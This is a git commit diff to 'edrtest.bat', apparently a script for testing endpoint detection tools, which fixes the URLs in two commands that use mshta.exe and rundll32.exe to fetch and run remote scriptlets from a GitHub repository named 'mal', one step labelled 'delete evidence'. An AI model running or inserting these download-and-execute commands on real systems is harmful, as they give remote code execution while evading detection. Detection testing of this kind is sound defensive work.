ed8f6805e5589d60a37fba82c1e11ca1f1286a0d
sgmr-gr <82320872+sgmr-gr@users.noreply.github.com>
2023-06-25 14:26:50 +0900

    Update edrtest.bat

--- edrtest.bat
+++ edrtest.bat
@@ -1,5 +1,5 @@
 echo EDR test powershell activity
-mshta.exe javascript:a=(GetObject("script:https://raw.githubusercontent.com/sgmr-gr/mal/edrtest2.sct")).Exec();close()
+mshta.exe javascript:a=(GetObject("script:https://raw.githubusercontent.com/sgmr-gr/mal/main/edrtest2.sct")).Exec();close()
 timeout 5
 echo EDR test delete evidence
-rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/sgmr-gr/mal/edrtest3")
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/sgmr-gr/mal/main/edrtest3")
